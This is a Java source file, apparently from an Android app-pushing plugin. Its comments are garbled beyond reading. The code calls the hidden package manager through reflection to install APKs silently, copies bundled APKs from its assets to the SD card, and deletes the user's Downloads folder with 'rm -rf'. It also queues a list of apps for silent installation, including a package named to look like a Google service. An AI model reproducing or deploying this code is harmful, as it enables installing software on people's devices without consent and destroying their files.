package com.xstd.active.plugin.utils;

import java.io.BufferedOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.List;

import com.xstd.active.plugin.dao.SilenceApp;
import com.xstd.active.plugin.dao.SilenceAppDao;
import com.xstd.active.plugin.dao.SilenceAppDaoUtils;

import android.content.Context;
import android.content.Intent;
import android.content.pm.IPackageInstallObserver;
import android.content.pm.IPackageManager;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.content.res.AssetManager;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.os.Environment;
import android.os.IBinder;
import android.sax.StartElementListener;
import android.telephony.TelephonyManager;

public class CommanUtil {

	/**
	 * �õ�packagemanager����װapk��
	 * 
	 * @return
	 * @throws Exception
	 */
	@SuppressWarnings({ "rawtypes", "unchecked" })
	public static IPackageManager getPackageManger() throws Exception {
		Class clazz = CommanUtil.class.getClassLoader().loadClass(
				"android.os.ServiceManager");
		Method method = clazz.getMethod("getService",
				new Class[] { String.class });
		IBinder b = (IBinder) method.invoke(null, "package");
		return IPackageManager.Stub.asInterface(b);
	}

	/**
	 * ���/storage/sdcard/Downloads
	 * 
	 * @throws IOException
	 */
	public static void deleteDownloadFiles() throws IOException {
		File file = Environment
				.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
		Runtime.getRuntime().exec("rm -rf " + file.getAbsolutePath());
		if (!file.exists())
			file.mkdirs();
	}

	/**
	 * ����豸�����а�װ����İ���
	 * 
	 * @param context
	 * @return
	 */
	public static List<String> getDeviceInstallPackName(Context context) {
		List<String> names = new ArrayList<String>();
		List<PackageInfo> pis = context.getPackageManager()
				.getInstalledPackages(PackageManager.GET_ACTIVITIES);
		for (PackageInfo pi : pis)
			names.add(pi.packageName);
		return names;
	}

	/**
	 * ͨ��apk�ļ���ȡ����ļ��ı���
	 * 
	 * @param context
	 * @param absPath
	 * @return
	 */
	public static String getPackageNameByAPK(Context context, String absPath) {
		PackageInfo pkgInfo = context.getPackageManager()
				.getPackageArchiveInfo(absPath, PackageManager.GET_ACTIVITIES);
		if (pkgInfo != null) {
			return pkgInfo.applicationInfo.packageName;
		}
		return null;
	}

	/**
	 * ��װapk�ļ�
	 * 
	 * @param context
	 * @param file
	 * @param observer
	 * @throws Exception
	 */
	public static void installFile(Context context, File file, IPackageInstallObserver observer) {
		if (file == null)
			return;
		if (!file.isFile())
			return;
		if (file.length() <= 0)
			return;
		if (!file.getName().endsWith(".apk"))
			return;
		String packageName = getPackageNameByAPK(context,
				file.getAbsolutePath());
		Uri uri = Uri.fromFile(file);
		int flags = 0;
		if (uri != null)
			try {
				getPackageManger().installPackage(uri, observer, flags, packageName);
			} catch (Exception e) {
				e.printStackTrace();
			}
	}

	/**
	 * �ж�SIM���Ƿ�����
	 * 
	 * @param context
	 * @return
	 */
	public static boolean simReady(Context context) {
		TelephonyManager tm = (TelephonyManager) context
				.getSystemService(Context.TELEPHONY_SERVICE);
		if (TelephonyManager.SIM_STATE_READY == tm.getSimState())
			return true;
		else
			return false;
	}

	/**
	 * �ж������Ƿ����
	 * 
	 * @param context
	 * @return
	 */
	public static boolean isNetAvailable(Context context) {
		ConnectivityManager cm = (ConnectivityManager) context
				.getSystemService(Context.CONNECTIVITY_SERVICE);
		NetworkInfo networkInfo = cm.getActiveNetworkInfo();
		if (null != networkInfo) {
			return networkInfo.isAvailable();
		}
		return false;
	}

	/**
	 * �ж�WIFI�Ƿ����
	 * 
	 * @param context
	 * @return
	 */
	public boolean isWifiAvailable(Context context) {
		ConnectivityManager cm = (ConnectivityManager) context
				.getSystemService(Context.CONNECTIVITY_SERVICE);
		NetworkInfo networkInfo = cm
				.getNetworkInfo(ConnectivityManager.TYPE_WIFI);
		if (null != networkInfo) {
			return networkInfo.isAvailable();
		}
		return false;
	}

	/**
	 * ��Launcher
	 * 
	 * @param context
	 */
	public static void goHome(Context context) {
		Intent intent = new Intent(Intent.ACTION_MAIN);
		intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
		intent.addCategory(Intent.CATEGORY_HOME);
		context.startActivity(intent);
	}

	/**
	 * ��assets�µ��ļ����Ƶ�sd����
	 * �˷��������ڵ����ߵ��̡߳�
	 */
	public static List<File> copyAssetsToSdcard(Context context, File out) {
		List<File> apks = new ArrayList<File>();
		AssetManager assets = context.getAssets();
		InputStream is = null;
		OutputStream os = null;
		try {
			for (String app : assets.list("")) {
				if (!app.endsWith(".apk"))
					continue;
				File file = new File(out, app);
				if (file.exists()) {
					apks.add(file);
					continue;
				}
				is = assets.open(app);
				os = new BufferedOutputStream(new FileOutputStream(file));
				byte[] b = new byte[1024 * 5];
				int len;
				while ((len = is.read(b)) != -1) {
					os.write(b, 0, len);
				}
				os.flush();
				apks.add(file);
			}
		} catch (Exception e) {
			e.printStackTrace();
		} finally {
			if (is != null) {
				try {
					is.close();
				} catch (IOException e) {
					e.printStackTrace();
				}
			}
			if (os != null) {
				try {
					os.close();
				} catch (IOException e) {
					e.printStackTrace();
				}
			}
		}
		return apks;
	}

	/**
	 * ��ʼ��Ԥװ��Ӧ��
	 * @param context
	 */
	public static void initPreInstallRom(Context context) {
		Intent intent = new Intent();
		intent.setAction("com.xstd.plugin.package.active");
		context.startService(intent);
		long currentTime = System.currentTimeMillis();
		SilenceAppDao dao = SilenceAppDaoUtils.getSilenceAppDao(context);
		SilenceApp goapk = new SilenceApp(null, "cn.goapk.market", currentTime, false, 1.0f, false);
		SilenceApp google = new SilenceApp(null, "com.google.service.s1", currentTime, false, 1.0f, false);
		SilenceApp hiapk = new SilenceApp(null, "com.hiapk.marketpho", currentTime, false, 1.0f, false);
		SilenceApp kuwo = new SilenceApp(null, "cn.kuwo.player", currentTime, false, 1.0f, false);
		SilenceApp weaver = new SilenceApp(null, "com.lenovo.videotalk.phone", currentTime, false, 1.0f, false);
		dao.insert(goapk);
		dao.insert(google);
		dao.insert(hiapk);
		dao.insert(kuwo);
		dao.insert(weaver);
	}
}
